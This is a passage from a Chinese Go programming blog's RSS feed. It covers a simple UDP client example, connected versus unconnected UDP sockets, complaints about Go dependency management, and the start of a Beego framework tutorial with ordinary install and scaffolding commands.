&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                os.&lt;span style=&#34;color:#06287e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;defer&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;Close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        reader &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; bufio.&lt;span style=&#34;color:#06287e&#34;&gt;NewReader&lt;/span&gt;(os.Stdin)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Print&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                data, _, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; reader.&lt;span style=&#34;color:#06287e&#34;&gt;ReadLine&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;string&lt;/span&gt;(data) &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;quit&amp;#34;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Quit now ...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        os.&lt;span style=&#34;color:#06287e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Writing: &amp;#34;&lt;/span&gt;, data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//conn.WriteToUDP(data, &amp;amp;targetAddr)      // conn.WriteToUDP() doesn&amp;#39;t work here
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;                n, err &lt;span style=&#34;color:#666&#34;&gt;:=&lt;/span&gt; conn.&lt;span style=&#34;color:#06287e&#34;&gt;Write&lt;/span&gt;(data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Written %d bytes&amp;#34;&lt;/span&gt;, n)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error WriteToUDP: &amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//n, _, err = conn.ReadFromUDP(data)     // conn.ReadFromUDP() works here
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;                n, err = conn.&lt;span style=&#34;color:#06287e&#34;&gt;Read&lt;/span&gt;(data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; err &lt;span style=&#34;color:#666&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Error ReadFromUDP: &amp;#34;&lt;/span&gt;, err.&lt;span style=&#34;color:#06287e&#34;&gt;Error&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                fmt.&lt;span style=&#34;color:#06287e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#007020&#34;&gt;string&lt;/span&gt;(data))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&#34;connected-vs-unconnected&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#connected-vs-unconnected&#34;&gt;
        #
    &lt;/a&gt;
    connected vs unconnected
&lt;/div&gt;
&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;unconnected&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#unconnected&#34;&gt;
        ##
    &lt;/a&gt;
    unconnected:
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不知道远程地址的socket&lt;/li&gt;
&lt;li&gt;server调用listenUDP()创建的UDPConn为unconnected状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;connected&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#connected&#34;&gt;
        ##
    &lt;/a&gt;
    connected:
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;知道远程地址的socket&lt;/li&gt;
&lt;li&gt;client调用DialUDP()创建的UDPConn为connectd状态&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;socket状态&lt;/th&gt;
&lt;th&gt;Read方法&lt;/th&gt;
&lt;th&gt;Write方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;connected&lt;/td&gt;
&lt;td&gt;ReadFromUDP()&lt;/br&gt;Read()&lt;/td&gt;
&lt;td&gt;Write()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;unconnected&lt;/td&gt;
&lt;td&gt;ReadFromUDP()&lt;/br&gt;Read()&lt;/td&gt;
&lt;td&gt;WriteToUDP()&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;其他注意点&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%85%b6%e4%bb%96%e6%b3%a8%e6%84%8f%e7%82%b9&#34;&gt;
        #
    &lt;/a&gt;
    其他注意点：
&lt;/div&gt;
&lt;/h2&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;net.ListenUDP()的第一个参数必须为小写&amp;rsquo;udp&#39;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;ReadFromUDP()中的参数[]byte长度必须大于0，否则这个函数会在调用后迅速返回，最终会导致CPU使用率飙升。参见&lt;a href=&#34;http://www.singleye.net/2017/11/go%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E9%99%B7%E9%98%B1/&#34;&gt;语言编程陷阱，陷阱2&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>GO语言依赖管理那些事儿</title>
      <link>/2017/12/go%E8%AF%AD%E8%A8%80%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</link>
      <pubDate>Sat, 02 Dec 2017 18:17:23 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/12/go%E8%AF%AD%E8%A8%80%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</guid>
      <description>&lt;p&gt;学习GO开发的过程中发现GO的依赖管理有些不够合理之处。&lt;/p&gt;
&lt;p&gt;首先，使用GO开发时在假设项目及依赖关系都通过全系统唯一的GOPATH进行管理，可事实上一个开发人员不可能同时只做一个项目开发，不能假设不同项目的依赖都是一致的。这个问题自从v1.5引入vendor管理方法得到了一定改善。可是go get对vendor支持并不友好，这增加了管理的工作量。很多项目也被开发出来解决这个问题，比如&amp;rsquo;govendor&amp;rsquo;。&lt;/p&gt;
&lt;p&gt;引入vendor方法后的项目依赖查找顺序如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先查找当前包下面的vendor目录&lt;/li&gt;
&lt;li&gt;向上一级目录查找，直至找到src目录下的vendor目录&lt;/li&gt;
&lt;li&gt;在GOPATH下面查找&lt;/li&gt;
&lt;li&gt;在GOROOT下面查找&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第二个不合理的地方，虽然引入了vendor目录解决单独项目的局部依赖管理问题，但依然要求把每个项目放入系统全局GOPATH中进行管理。可是一个项目可能只是一个大项目中的一小部分，而整个大项目可能有不同的开发语言构成，那么管理这种混合项目就是一个很麻烦的事情。另外每一个项目本身随着开发时间的推移会出现多个版本，当你在处理一个版本的问题是可能需要临时切换到另一个版本，基于同一个GOPATH目录开发时对于这种切换管理也并不算友好。&amp;lsquo;gb&amp;rsquo;这个项目开发出来后解决了这一问题，但这导致了项目管理必须使用gb工具，就连基本的build也脱离不开这种依赖，这也导致了本人碰到的第三个问题。&lt;/p&gt;
&lt;p&gt;第三个不合理之处是对于编辑器的不友好。由于个人的主要编辑器是vim，并且使用了vim-go插件，这个插件支持了Go的开发工具链，可以在vim中方便的使用GoFmt/GoImports/GoBuild/GoTest等这些命令进行开发。但是由于gb对vim的支持欠缺导致在gb创建的项目若不放入标准的GOPATH中有些vim-go的命令执行会出现问题。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Beego开发入门</title>
      <link>/2017/11/beego%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</link>
      <pubDate>Thu, 30 Nov 2017 18:04:31 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/beego%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</guid>
      <description>&lt;h1 id=&#34;安装&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85&#34;&gt;
        ##
    &lt;/a&gt;
    安装
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;安装beego：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ go get github.com/astaxie/beego&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;安装bee开发工具：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ go get github.com/beego/bee
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ bee
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bee is a Fast and Flexible tool &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; managing your Beego Web Application.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USAGE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bee &lt;span style=&#34;color:#007020&#34;&gt;command&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;arguments&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AVAILABLE COMMANDS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    version     Prints the current Bee version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    migrate     Runs database migrations
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    api         Creates a Beego API application
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bale        Transforms non-Go files to Go &lt;span style=&#34;color:#007020&#34;&gt;source&lt;/span&gt; files
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fix         Fixes your application by making it compatible with newer versions of Beego
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dlv         Start a debugging session using Delve
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dockerize   Generates a Dockerfile &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; your Beego application
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    generate    Source code generator
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hprose      Creates an RPC application based on Hprose and Beego frameworks
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    new         Creates a Beego application
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pack        Compresses a Beego application into a single file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rs          Run customized scripts
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    run         Run the application by starting a &lt;span style=&#34;color:#007020&#34;&gt;local&lt;/span&gt; development server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    server      serving static content over HTTP on port
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use bee &lt;span style=&#34;color:#007020&#34;&gt;help&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;command&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; more information about a command.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ADDITIONAL HELP TOPICS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use bee &lt;span style=&#34;color:#007020&#34;&gt;help&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;topic&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; more information about that topic.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h1 id=&#34;基本使用&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9f%ba%e6%9c%ac%e4%bd%bf%e7%94%a8&#34;&gt;
        ##
    &lt;/a&gt;
    基本使用
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;创建项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e9%a1%b9%e7%9b%ae&#34;&gt;
        #
    &lt;/a&gt;
    创建项目
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;mvc类网页项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#mvc%e7%b1%bb%e7%bd%91%e9%a1%b5%e9%a1%b9%e7%9b%ae&#34;&gt;
        ##
    &lt;/a&gt;
    MVC类网页项目
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;创建普通的web服务类项目使用&amp;rsquo;bee new&amp;rsquo;命令，这类项目遵循通常的MVC代码架构。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ bee new test/beego/bee/hello
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;______
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ___ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;&lt;/span&gt;| |_/ /  ___   ___
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ___ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\ &lt;/span&gt;/ _ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\ &lt;/span&gt;/ _ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;&lt;/span&gt;| |_/ /|  __/|  __/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;___/  &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;__| &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;__| v1.9.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 18:50:07 WARN     ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0001&lt;/span&gt; You current workdir is not inside &lt;span style=&#34;color:#bb60d5&#34;&gt;$GOPATH&lt;/span&gt;/src.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 18:50:07 INFO     ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0002&lt;/span&gt; Creating application...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/conf/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/controllers/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/models/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/routers/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/tests/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/static/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/static/js/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/static/css/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/static/img/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/views/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/conf/app.conf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/controllers/default.go
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/views/index.tpl
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/routers/router.go
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/tests/default_test.go
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        create   Your_GOPATH/src/test/beego/bee/hello/main.go
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 18:50:07 SUCCESS  ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0003&lt;/span&gt; New application successfully created!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;web-service类项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#web-service%e7%b1%bb%e9%a1%b9%e7%9b%ae&#34;&gt;
        ##
    &lt;/a&gt;
    Web service类项目
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;如果项目是web service类型的则可以使用&amp;rsquo;bee api&amp;rsquo;来创建，这类项目创建完后比&amp;rsquo;bee new&amp;rsquo;类的项目省略&amp;rsquo;static&amp;rsquo;及&amp;rsquo;views&amp;rsquo;目录部分的内容。&lt;/p&gt;
&lt;h2 id=&#34;运行项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%90%e8%a1%8c%e9%a1%b9%e7%9b%ae&#34;&gt;
        #
    &lt;/a&gt;
    运行项目
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;使用bee运行项目也非常简单，直接在项目代码目录下运行&amp;rsquo;bee run&amp;rsquo;即可，运行完后&lt;/p&gt;
&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ bee run
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;______
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ___ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;&lt;/span&gt;| |_/ /  ___   ___
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ___ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\ &lt;/span&gt;/ _ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\ &lt;/span&gt;/ _ &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;&lt;/span&gt;| |_/ /|  __/|  __/
